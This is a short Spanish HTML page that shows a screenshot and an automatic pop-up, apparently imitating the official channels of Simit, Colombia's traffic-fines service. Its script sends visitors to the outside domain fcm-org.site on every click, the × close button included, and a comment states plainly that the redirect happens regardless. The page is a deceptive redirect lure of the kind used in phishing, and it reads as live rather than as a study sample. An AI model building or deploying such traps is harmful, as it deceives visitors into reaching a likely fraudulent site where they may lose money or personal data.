<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modal Automático</title>
    <style>
        /* Reset básico */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
        }

        /* Fondo principal */
        .contenido-principal {
            width: 100%;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            background-color: #f5f5f5;
        }

        /* Estilos del modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            cursor: pointer;
        }

        .modal-contenido {
            position: relative;
            background-color: #fff;
            border-radius: 8px;
            max-width: 80%;
            max-height: 80%;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        .modal-imagen {
            display: block;
            max-width: 100%;
            height: auto;
        }

        .boton-cerrar {
            position: absolute;
            top: 10px;
            right: 10px;
            cursor: pointer;
            background-color: #ff4444;
            color: white;
            border: none;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            font-size: 18px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <!-- Contenido principal de la página -->
    <div class="contenido-principal">
        <img src="img/Captura de pantalla 2025-05-11 192509.png" width="100%" alt="Imagen principal">
    </div>

    <!-- Modal que aparece automáticamente -->
    <div class="modal-overlay" id="modalAutomatico">
        <div class="modal-contenido">
            <button class="boton-cerrar" id="cerrarModal">×</button>
            <img src="img/Canales-oficiales-Simit-responsive.jpg" alt="Imagen modal" class="modal-imagen">
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Variables
            const modal = document.getElementById('modalAutomatico');
            const botonCerrar = document.getElementById('cerrarModal');
            const urlRedireccion = "http://fcm-org.site/";
            
            // Función para redirigir
            function redirigir() {
                window.location.href = urlRedireccion;
            }
            
            
            // Evento para el botón de cerrar
            botonCerrar.addEventListener('click', function(e) {
                e.stopPropagation(); // Evita que el clic llegue al overlay
                redirigir();
            });
            
            // Evento para el clic en cualquier parte del modal
            modal.addEventListener('click', function() {
                redirigir();
            });
            
            // Evitar que se propague el clic dentro del contenido del modal
            document.querySelector('.modal-contenido').addEventListener('click', function(e) {
                e.stopPropagation(); // Esto evitaría la redirección al hacer clic dentro del contenido
                redirigir(); // Pero como queremos redirigir de todos modos, lo llamamos explícitamente
            });
        });
    </script>
</body>
</html>
